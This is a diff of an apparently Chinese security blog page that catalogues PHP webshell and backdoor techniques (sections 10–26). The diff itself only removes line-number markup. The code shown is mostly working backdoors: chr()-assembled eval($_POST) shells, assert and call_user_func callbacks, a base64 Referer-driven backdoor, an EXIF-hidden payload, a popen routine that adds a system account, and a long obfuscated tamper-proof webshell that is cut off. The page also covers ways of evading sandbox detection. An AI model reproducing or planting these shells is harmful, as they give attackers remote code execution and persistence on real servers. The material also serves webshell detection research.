-<h3 id="10-LFI导致的代码执行"><a href="#10-LFI导致的代码执行" class="headerlink" title="10. LFI导致的代码执行"></a>10. LFI导致的代码执行</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="10-LFI导致的代码执行"><a href="#10-LFI导致的代码执行" class="headerlink" title="10. LFI导致的代码执行"></a>10. LFI导致的代码执行</h3><pre class="language-none"><code class="language-none">&lt;?php
     $to_include &#x3D; $_GET[&#39;file&#39;];
     require_once($to_include);
 ?&gt;
@@ -783,9 +783,9 @@ http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?op&#x3D;$&#123;$&#123;fputs
 eval(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)); 
 
 &#x2F;&#x2F; 这种LFI可能导致攻击者将文件包含漏洞升级为代码执行漏洞
-http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</code></pre>
 
-<h3 id="11-PHP动态创建匿名函数-Lamda表达式"><a href="#11-PHP动态创建匿名函数-Lamda表达式" class="headerlink" title="11. PHP动态创建匿名函数(Lamda表达式)"></a>11. PHP动态创建匿名函数(Lamda表达式)</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 利用动态变量直接动态执行函数，PHP允许使用create_function动态的进行&quot;匿名函数(Lamda)&quot;的创建、
+<h3 id="11-PHP动态创建匿名函数-Lamda表达式"><a href="#11-PHP动态创建匿名函数-Lamda表达式" class="headerlink" title="11. PHP动态创建匿名函数(Lamda表达式)"></a>11. PHP动态创建匿名函数(Lamda表达式)</h3><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 利用动态变量直接动态执行函数，PHP允许使用create_function动态的进行&quot;匿名函数(Lamda)&quot;的创建、
 
 string create_function ( string $args , string $code )
 &lt;?php
@@ -816,10 +816,10 @@ http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?1&#x3D;phpinfo()
     lambda_n();
 ?&gt;
 
-&#x2F;&#x2F; 在PHP内部 create_function() 只是对 eval()的一层封装，最终还是使用eval()进行代码执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#x2F;&#x2F; 在PHP内部 create_function() 只是对 eval()的一层封装，最终还是使用eval()进行代码执行</code></pre>
 
 <p>create_function另一种形式</p>
-<pre class="line-numbers language-none"><code class="language-none">gif89a
+<pre class="language-none"><code class="language-none">gif89a
 &lt;?php
     $_chr &#x3D; chr(99).chr(104).chr(114); &#x2F;&#x2F;chr  
     $_eval_post_1 &#x3D; $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); &#x2F;&#x2F;eval($_POST[1]); 
@@ -827,9 +827,9 @@ http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?1&#x3D;phpinfo()
 
     $_&#x3D; $_create_function(&quot;&quot;,$_eval_post_1); &#x2F;&#x2F;die(var_dump($_create_function ));
     @$_();
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="12-利用系统输出缓存"><a href="#12-利用系统输出缓存" class="headerlink" title="12. 利用系统输出缓存"></a>12. 利用系统输出缓存</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="12-利用系统输出缓存"><a href="#12-利用系统输出缓存" class="headerlink" title="12. 利用系统输出缓存"></a>12. 利用系统输出缓存</h3><pre class="language-none"><code class="language-none">&lt;?php
     $foobar &#x3D; &#39;system&#39;;
     ob_start($foobar);
     echo &quot;dir c:&quot;;
@@ -844,9 +844,9 @@ http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?1&#x3D;phpinfo()
     ob_start(function ($c,$d)&#123;register_shutdown_function(&#39;assert&#39;,$c);&#125;); 
     echo $_REQUEST[&#39;pass&#39;]; 
     ob_end_flush(); 
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="13-利用assert-断言"><a href="#13-利用assert-断言" class="headerlink" title="13. 利用assert()断言"></a>13. 利用assert()断言</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="13-利用assert-断言"><a href="#13-利用assert-断言" class="headerlink" title="13. 利用assert()断言"></a>13. 利用assert()断言</h3><pre class="language-none"><code class="language-none">&lt;?php
     $foobar &#x3D; &#39;system(&quot;dir&quot;)&#39;;
     assert($foobar);
 ?&gt;
@@ -854,16 +854,16 @@ http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?1&#x3D;phpinfo()
 1. 断言这个功能应该只被用来调试
 2. 应该用于完整性检查时测试条件是否始终应该为 TRUE
 3. 来指示某些程序错误
-4. 或者检查具体功能的存在(类似扩展函数或特定的系统限制和功能)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+4. 或者检查具体功能的存在(类似扩展函数或特定的系统限制和功能)</code></pre>
 
 <h3 id="14-数组映射类型函数处理后的回调机制"><a href="#14-数组映射类型函数处理后的回调机制" class="headerlink" title="14. 数组映射类型函数处理后的回调机制"></a>14. 数组映射类型函数处理后的回调机制</h3><p>array_map — 将回调函数作用到给定数组的单元上，可以利用array_map的这个特点，将第一个参数(回调函数)作为命令执行管道，第二个参数(callback参数)作为payload传入，从而构将传统的函数调用(payload)的模式转换为array_map(指令执行，payload)</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
+<pre class="language-none"><code class="language-none">&lt;?php 
     $new_array &#x3D; array_map(&quot;ass\x65rt&quot;, (array)$_REQUEST[&#39;op&#39;]);
 ?&gt;
 
-&#x2F;&#x2F;http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?op&#x3D;eval($_GET[1]): 菜刀密码: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#x2F;&#x2F;http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?op&#x3D;eval($_GET[1]): 菜刀密码: 1</code></pre>
 
-<h3 id="15-PHP序列化-x2F-反序列化特性布置后门"><a href="#15-PHP序列化-x2F-反序列化特性布置后门" class="headerlink" title="15. PHP序列化&#x2F;反序列化特性布置后门"></a>15. PHP序列化&#x2F;反序列化特性布置后门</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="15-PHP序列化-x2F-反序列化特性布置后门"><a href="#15-PHP序列化-x2F-反序列化特性布置后门" class="headerlink" title="15. PHP序列化&#x2F;反序列化特性布置后门"></a>15. PHP序列化&#x2F;反序列化特性布置后门</h3><pre class="language-none"><code class="language-none">&lt;?php
     class Example
     &#123;
        var $var &#x3D; &#39;&#39;;
@@ -881,9 +881,9 @@ http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?1&#x3D;phpinfo()
 O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;&#125;  
 http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?saved_code&#x3D;O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;&#125;  
 
-&#x2F;&#x2F; 原理: 被序列化的对象在反序列化的时候会自动调用它的析构函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#x2F;&#x2F; 原理: 被序列化的对象在反序列化的时候会自动调用它的析构函数</code></pre>
 
-<h3 id="16-使用HTTP头部字段进行指令传输"><a href="#16-使用HTTP头部字段进行指令传输" class="headerlink" title="16. 使用HTTP头部字段进行指令传输"></a>16. 使用HTTP头部字段进行指令传输</h3><pre class="line-numbers language-none"><code class="language-none">通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果。
+<h3 id="16-使用HTTP头部字段进行指令传输"><a href="#16-使用HTTP头部字段进行指令传输" class="headerlink" title="16. 使用HTTP头部字段进行指令传输"></a>16. 使用HTTP头部字段进行指令传输</h3><pre class="language-none"><code class="language-none">通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果。
 
 backdoor:
 &lt;?php
@@ -920,9 +920,9 @@ backdoor:
     echo curl_exec($ch);
 ?&gt;
 
-&#x2F;&#x2F; 这个webshell通过编码的referer来传递攻击载荷，HTTP通信的头部的任何字段、或者HTTP的数据部分的任何字段都可以当作webshell的payload来传递数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#x2F;&#x2F; 这个webshell通过编码的referer来传递攻击载荷，HTTP通信的头部的任何字段、或者HTTP的数据部分的任何字段都可以当作webshell的payload来传递数据</code></pre>
 
-<h3 id="17-乱序拼接法"><a href="#17-乱序拼接法" class="headerlink" title="17. 乱序拼接法"></a>17. 乱序拼接法</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php  
+<h3 id="17-乱序拼接法"><a href="#17-乱序拼接法" class="headerlink" title="17. 乱序拼接法"></a>17. 乱序拼接法</h3><pre class="language-none"><code class="language-none">&lt;?php  
     @$_&#x3D;&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;;  
     @$_&#x3D;&quot;a&quot;.$_.&quot;t&quot;;  
     @$_($&#123;&quot;_P&quot;.&quot;OS&quot;.&quot;T&quot;&#125;[1-2-5]);
@@ -945,9 +945,9 @@ backdoor:
 
 1) &quot;乱序插入&quot;是在一段正常的webshell代码中随机插入一些杂乱的无意义的字母，然后再在下面使用preg_replace之类的正则替换来去除掉这些&quot;混淆盐字母&quot;，以还原出原有的正常的webshell代码
 
-2) 这种做法先定义一个&quot;字母池&quot;，这个&quot;字母池&quot;包含有我们需要构造的关键函数的字符。我们通过从这个字母池中选取特定的索引下的字母，以此来构造出我们想要的&quot;动态函数&quot;(system、base64_decode)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+2) 这种做法先定义一个&quot;字母池&quot;，这个&quot;字母池&quot;包含有我们需要构造的关键函数的字符。我们通过从这个字母池中选取特定的索引下的字母，以此来构造出我们想要的&quot;动态函数&quot;(system、base64_decode)</code></pre>
 
-<h3 id="18-PHP管道技术利用"><a href="#18-PHP管道技术利用" class="headerlink" title="18. PHP管道技术利用"></a>18. PHP管道技术利用</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="18-PHP管道技术利用"><a href="#18-PHP管道技术利用" class="headerlink" title="18. PHP管道技术利用"></a>18. PHP管道技术利用</h3><pre class="language-none"><code class="language-none">&lt;?php
     &#x2F;*
         PHP中如何增加一个系统用户
         下面是一段例程，
@@ -963,14 +963,14 @@ backdoor:
     @pclose($fp);
 ?&gt;
 
-&#x2F;&#x2F; 命令执行成功，添加账户成功。PHP执行命令有很多方法，eval、passthru、system、assert、popen、exec、shell_exec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#x2F;&#x2F; 命令执行成功，添加账户成功。PHP执行命令有很多方法，eval、passthru、system、assert、popen、exec、shell_exec</code></pre>
 
-<h3 id="19-PHP指令替换"><a href="#19-PHP指令替换" class="headerlink" title="19. PHP指令替换"></a>19. PHP指令替换</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php   
+<h3 id="19-PHP指令替换"><a href="#19-PHP指令替换" class="headerlink" title="19. PHP指令替换"></a>19. PHP指令替换</h3><pre class="language-none"><code class="language-none">&lt;?php   
     $cmd &#x3D; &#96;dir&#96;;  
     echo $cmd;   
-?&gt;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;  </code></pre>
 
-<h3 id="20-基于图片文件非可显示字段部署PHP木马"><a href="#20-基于图片文件非可显示字段部署PHP木马" class="headerlink" title="20. 基于图片文件非可显示字段部署PHP木马"></a>20. 基于图片文件非可显示字段部署PHP木马</h3><pre class="line-numbers language-none"><code class="language-none">Malware Hidden Inside JPG EXIF Headers: exif_read_data() 函数从 JPEG 或 TIFF 图像文件中读取 EXIF 头信息。这样就可以读取数码相机产生的元数据
+<h3 id="20-基于图片文件非可显示字段部署PHP木马"><a href="#20-基于图片文件非可显示字段部署PHP木马" class="headerlink" title="20. 基于图片文件非可显示字段部署PHP木马"></a>20. 基于图片文件非可显示字段部署PHP木马</h3><pre class="language-none"><code class="language-none">Malware Hidden Inside JPG EXIF Headers: exif_read_data() 函数从 JPEG 或 TIFF 图像文件中读取 EXIF 头信息。这样就可以读取数码相机产生的元数据
 
 &lt;?php
     echo &quot;img.jpg:&lt;br &#x2F;&gt;\n&quot;;
@@ -1011,9 +1011,9 @@ backdoor:
     var_dump($exif[&#39;IFD0&#39;][&#39;Subject&#39;]);
     preg_replace($exif[&#39;IFD0&#39;][&#39;ImageDescription&#39;], $exif[&#39;IFD0&#39;][&#39;Subject&#39;],&#39;&#39;);
     &#x2F;&#x2F;die();
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="21-注释-反射机制"><a href="#21-注释-反射机制" class="headerlink" title="21. 注释+反射机制"></a>21. 注释+反射机制</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 将webshell放到了&#x2F;**&#x2F;注释中，然后利用类的反射机制获取到，进行动态函数的执行
+<h3 id="21-注释-反射机制"><a href="#21-注释-反射机制" class="headerlink" title="21. 注释+反射机制"></a>21. 注释+反射机制</h3><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 将webshell放到了&#x2F;**&#x2F;注释中，然后利用类的反射机制获取到，进行动态函数的执行
 
 &lt;?php  
     &#x2F;**   
@@ -1053,10 +1053,10 @@ backdoor:
     $fu&#x3D;substr($str,strpos($str,&#39;as&#39;),4);
     $fu&#x3D;$fu.substr($str,strpos($str,&#39;r&#39;),2);
     $fu($evf);
-?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt; </code></pre>
 
 <h3 id="22-自毁性Webshell"><a href="#22-自毁性Webshell" class="headerlink" title="22. 自毁性Webshell"></a>22. 自毁性Webshell</h3><p>PHP的动态沙箱检测技术，对PHP执行引擎进行hook进行动态检测，即构造出一个沙箱，让目标脚本在里面执行一次，然后对执行的结果进行判断；而我们的沙箱在触发这个脚本执行的时候由于没有给定准确的参数”code”，就会导致毁灭性覆写”fwrite ($fp, $content)”的结果，这样，沙箱的执行结果就是一个普通的文本，这种方法利用沙箱的机制，沙箱导致了文件的毁坏</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
     &#x2F;&#x2F;$url &#x3D; $_SERVER[&#39;PHP_SELF&#39;];
     &#x2F;&#x2F;$filename &#x3D; end(explode(&#39;&#x2F;&#39;,$url));
     &#x2F;&#x2F;die($filename);
@@ -1084,9 +1084,9 @@ backdoor:
         &#125;
         exit;
     &#125;
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="23-利用本地变量注册技术"><a href="#23-利用本地变量注册技术" class="headerlink" title="23. 利用本地变量注册技术"></a>23. 利用本地变量注册技术</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 利用extract函数将输入数据注册为本地变量，然后利用PHP的动态执行特性进行动态函数执行
+<h3 id="23-利用本地变量注册技术"><a href="#23-利用本地变量注册技术" class="headerlink" title="23. 利用本地变量注册技术"></a>23. 利用本地变量注册技术</h3><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 利用extract函数将输入数据注册为本地变量，然后利用PHP的动态执行特性进行动态函数执行
 
 &lt;?php
     @extract ($_REQUEST);
@@ -1098,14 +1098,14 @@ http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;index.php?ctime&#x3D;assert&amp;atime&
 HP中有三种姿势可能导致本地变量注册，进而利用PHP的动态函数执行技巧进行WEBSHELL的构造
 1) extract
 2) parse_str
-3) foreach(..) &#123; $$key &#x3D; $value; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+3) foreach(..) &#123; $$key &#x3D; $value; &#125;</code></pre>
 
-<h3 id="24-利用ReflectionFunction反射"><a href="#24-利用ReflectionFunction反射" class="headerlink" title="24. 利用ReflectionFunction反射"></a>24. 利用ReflectionFunction反射</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="24-利用ReflectionFunction反射"><a href="#24-利用ReflectionFunction反射" class="headerlink" title="24. 利用ReflectionFunction反射"></a>24. 利用ReflectionFunction反射</h3><pre class="language-none"><code class="language-none">&lt;?php
     $func &#x3D; new ReflectionFunction(&quot;system&quot;);
     echo $func-&gt;invokeArgs(array(&quot;$_GET[c]&quot;));
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="25-利用PHP自定义函数"><a href="#25-利用PHP自定义函数" class="headerlink" title="25. 利用PHP自定义函数"></a>25. 利用PHP自定义函数</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="25-利用PHP自定义函数"><a href="#25-利用PHP自定义函数" class="headerlink" title="25. 利用PHP自定义函数"></a>25. 利用PHP自定义函数</h3><pre class="language-none"><code class="language-none">&lt;?php
     if(key($_GET)&#x3D;&#x3D;&#39;dede&#39;)
         &#x2F;&#x2F;call_user_func($_GET[&#39;dede&#39;], &quot;@eval($_POST[bs]);&quot;);
         call_user_func($_GET[&#39;dede&#39;], base64_decode(&#39;QGV2YWwoJF9QT1NUW2JzXSk7&#39;));
@@ -1116,12 +1116,12 @@ HP中有三种姿势可能导致本地变量注册，进而利用PHP的动态函
     call_user_func($_GET[&#39;dede&#39;], base64_decode(&#39;QGV2YWwoJF9QT1NUW2JzXSk7&#39;)); 
 ?&gt;
 
-http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?dede&#x3D;assert<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?dede&#x3D;assert</code></pre>
 
 <h3 id="26-防篡改WEBSHELL"><a href="#26-防篡改WEBSHELL" class="headerlink" title="26. 防篡改WEBSHELL"></a>26. 防篡改WEBSHELL</h3><p>这种WEBSHELL遵循了严格的生成逻辑，并精确地在代码中加入了花指令，只有文件完好无损才能正常解密出原始文件并执行，一旦文件遭到了任何修改，则解密过程会失败，导致webshell无法执行</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php &#x2F;* Powered by www.qibosoft.com *&#x2F;$lll11l11l11l11l1&#x3D;__FILE__;eval(base64_decode(&#39;JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbDExbDExbDExbDEsJ3JiJyk7ZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjE2MCk7JGxsMWxsbGwxMTExMTExMWw9ZXhwbG9kZSgiXHQiLGJhc2U2NF9kZWNvZGUoZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjcyKSkpOw&#x3D;&#x3D;&#39;));$lll111111ll1l1ll&#x3D;$ll1llll11111111l[0];$l1ll11lllll1ll1l&#x3D;$lll111111ll1l1ll&#123;2&#125;.$lll111111ll1l1ll&#123;5&#125;.$lll111111ll1l1ll&#123;8&#125;.$lll111111ll1l1ll&#123;11&#125;.$lll111111ll1l1ll&#123;14&#125;.$lll111111ll1l1ll&#123;17&#125;.$lll111111ll1l1ll&#123;20&#125;.$lll111111ll1l1ll&#123;23&#125;.$lll111111ll1l1ll&#123;26&#125;.$lll111111ll1l1ll&#123;29&#125;.$lll111111ll1l1ll&#123;32&#125;.$lll111111ll1l1ll&#123;35&#125;.$lll111111ll1l1ll&#123;38&#125;;$l11llll111l1l11l&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[1]);$l1l11111ll1l1l1l&#x3D;$l1ll11lllll1ll1l($l11llll111l1l11l&#123;2&#125;.$l11llll111l1l11l&#123;5&#125;.$l11llll111l1l11l&#123;8&#125;.$l11llll111l1l11l&#123;11&#125;.$l11llll111l1l11l&#123;14&#125;.$l11llll111l1l11l&#123;17&#125;.$l11llll111l1l11l&#123;20&#125;.$l11llll111l1l11l&#123;23&#125;);$lll1ll11l11l1ll1&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[2]);$l111ll111lll1111&#x3D;$l1ll11lllll1ll1l($lll1ll11l11l1ll1&#123;2&#125;.$lll1ll11l11l1ll1&#123;5&#125;.$lll1ll11l11l1ll1&#123;8&#125;.$lll1ll11l11l1ll1&#123;11&#125;.$lll1ll11l11l1ll1&#123;14&#125;.$lll1ll11l11l1ll1&#123;17&#125;.$lll1ll11l11l1ll1&#123;20&#125;.$lll1ll11l11l1ll1&#123;23&#125;);$ll1lll1lll111111&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[3]);$ll11llllll1lllll&#x3D;$l1ll11lllll1ll1l($ll1lll1lll111111&#123;2&#125;.$ll1lll1lll111111&#123;5&#125;.$ll1lll1lll111111&#123;8&#125;.$ll1lll1lll111111&#123;11&#125;.$ll1lll1lll111111&#123;14&#125;.$ll1lll1lll111111&#123;17&#125;.$ll1lll1lll111111&#123;20&#125;.$ll1lll1lll111111&#123;23&#125;);$lll1ll11l1111l11&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[4]);$ll1111l11l11llll&#x3D;$l1ll11lllll1ll1l($lll1ll11l1111l11&#123;2&#125;.$lll1ll11l1111l11&#123;5&#125;.$lll1ll11l1111l11&#123;8&#125;.$lll1ll11l1111l11&#123;11&#125;.$lll1ll11l1111l11&#123;14&#125;.$lll1ll11l1111l11&#123;17&#125;.$lll1ll11l1111l11&#123;20&#125;.$lll1ll11l1111l11&#123;23&#125;);$llll11l1ll111l1l&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[5]);$llllll1l11llllll&#x3D;$l1ll11lllll1ll1l($llll11l1ll111l1l&#123;2&#125;.$llll11l1ll111l1l&#123;5&#125;.$llll11l1ll111l1l&#123;8&#125;.$llll11l1ll111l1l&#123;11&#125;.$llll11l1ll111l1l&#123;14&#125;.$llll11l1ll111l1l&#123;17&#125;.$llll11l1ll111l1l&#123;20&#125;.$llll11l1ll111l1l&#123;23&#125;);eval($l1ll11lllll1ll1l(&#39;JGxsMTFsbGxsbGwxbGxsbGwoJGxsMTFsbGwxMWxsbGwxMWwsMTcpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJGxsMTFsbGxsbGwxbGxsbGwoJGxsMTFsbGwxMWxsbGwxMWwsMjMyKSkpOw&#x3D;&#x3D;&#39;));return ;?&gt;dGFiMWVhYjlzY2RlYjg2dG00cXVfZWJkY2ZlanFjMnZvdHBkdndlCU5UWmFjM0p0ZVRnNWJXbDNZV0phYkhsWGNIazBkWE05CWVHNWFPV050WWpGa2NYTnNhbkZrWm1oSVkzaE5jbkU5CWRucGFNVEZ1YW1KS2NIUnNabUpaYm1wWFpIQlJkMjQ5CU9HSmpZV3N6YjJ0U2FXMTVjSE5rYkdWSWMyaEpaSFk5CVoydGFkR0Z0YzNZNVlubDNjbnBhTjNSWGNtczBNbXM54bSULjFL6pblYuIkpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;AhDBms0qm82LqpqMrHT1O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;tGLOYY5fUpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;JqjcRhp75i6Lf4MwjO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;yS0ttoM7R7SDkJpvuNKUO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;vMCvyQqBIgcoO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;agQLu9pzZf25xZjXjO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UVXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;WOmDsuNvUYJUFK3O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;hx7OShbiw40pgFI3OeYhO2